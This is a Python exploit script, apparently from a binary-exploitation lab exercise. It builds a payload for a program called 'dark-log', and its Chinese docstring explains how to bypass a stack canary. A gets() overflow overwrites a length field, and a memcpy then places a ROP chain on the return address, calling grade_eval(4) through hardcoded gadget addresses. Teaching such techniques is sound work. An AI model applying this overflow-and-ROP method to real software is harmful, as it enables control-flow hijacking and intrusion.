#!/usr/bin/env python3
"""Task 4 — Canary 绕过  (binary: attack/dark-log)

dark-log 开了栈保护 (canary)，直接溢出会触发 __stack_chk_fail。
但 input() 存在逻辑漏洞：

    struct log_frame { char expression[128]; char logMsg[128]; int len; char pad[8]; };
    gets(f.expression);                              // 无边界，可一路覆盖
    memcpy(f.logMsg + f.len, f.expression, 128);     // 目的地址 = logMsg + len

栈帧偏移 (相对 rbp):
    expression = rbp-0x120,  logMsg = rbp-0xA0,  len = rbp-0x20,  canary = rbp-0x8,
    saved rbp = rbp+0,  return addr = rbp+8。

绕过思路：
  1) gets 先把 expression 一路写满到 len 字段(expression+0x100)，把 len 改成 0xA8。
     但输入长度严格 < 0x118 字节(=canary 相对 expression 的偏移 280)，
     所以 gets 本身不碰 canary。
  2) 随后 memcpy 把 expression[0..127] 复制到 logMsg+len = (rbp-0xA0)+0xA8 = rbp+8，
     即恰好覆盖返回地址（及其之后），整段写入“跳过”了 canary 所在位置，canary 不变。
  3) 函数尾部 canary 校验通过，leave/ret 跳到我们写入返回地址处的 ROP 链。

ROP 目标：dark-log 没有 system@plt，用 pop rdi 把 4 传给 grade_eval()，
grade_eval(4) 会打印  "Hope A will be your grade!" ——作为控制流被成功劫持的证据。
二进制无 PIE，地址固定，与栈地址无关，稳定可靠。

关键地址 (dark-log):
    pop rdi;ret = 0x4018a3
    grade_eval  = 0x401677
"""
import sys, struct

pop_rdi    = 0x4018a3
grade_eval = 0x401677
LEN        = 0xA8            # 使 logMsg+len 指向返回地址

# 这 128 字节会被 memcpy 落到“返回地址”开始处，即 ROP 链
chain  = struct.pack("<Q", pop_rdi)
chain += struct.pack("<Q", 4)            # rdi = 4
chain += struct.pack("<Q", grade_eval)   # grade_eval(4)
chain += b"A" * (128 - len(chain))       # expression[0..127] 其余填充

body  = chain
body += b"B" * (256 - len(body))         # expression[128..255]
body += struct.pack("<i", LEN)           # expression[256..259] = len = 0xA8
assert len(body) == 260 and len(body) < 280   # 不触碰 canary(偏移 280)

sys.stdout.buffer.write(body + b"\n")
